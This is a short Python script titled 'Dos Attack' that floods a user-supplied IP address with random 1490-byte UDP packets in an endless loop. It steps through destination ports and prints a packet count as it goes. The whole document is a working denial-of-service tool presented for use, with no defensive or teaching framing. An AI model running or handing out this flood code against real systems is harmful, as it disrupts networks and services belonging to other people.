''' 

         Dos Attack 

                         '''
import socket
import random
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
bytes=random._urandom(1490)
ip=input("Target Ip : ")
port=int(input("Port : "))
sent=0
while True :
    s.sendto(bytes,(ip,port))
    sent = sent + 1
    port = port + 1
    print("send {} Packets,IP: {} Attack Port [{}]".format(sent,ip,port))
    if sent == 65534 :
        port = 1
        